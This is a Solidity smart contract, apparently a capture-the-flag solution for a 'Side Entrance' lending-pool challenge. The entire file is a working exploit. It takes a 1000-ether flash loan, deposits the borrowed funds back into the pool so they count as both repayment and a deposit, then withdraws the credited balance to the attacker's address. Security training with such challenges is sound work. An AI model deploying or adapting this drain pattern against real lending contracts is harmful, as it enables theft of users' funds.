// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {
    address attacker;
    SideEntranceLenderPool pool;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
        attacker = msg.sender;
    }

    function Attack() public {
        require(msg.sender == attacker, "Only attacker can attack");
        pool.flashLoan(1000 ether);
    }

    function execute() external payable {
        require(address(pool) == msg.sender, "Only pool can execute");
        pool.deposit{value: 1000 ether}();
    }

    function withdraw() public {
        require(msg.sender == attacker, "Only attacker can call");
        pool.withdraw();
        (bool sent,) = payable(attacker).call{value: 1000 ether}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}
}
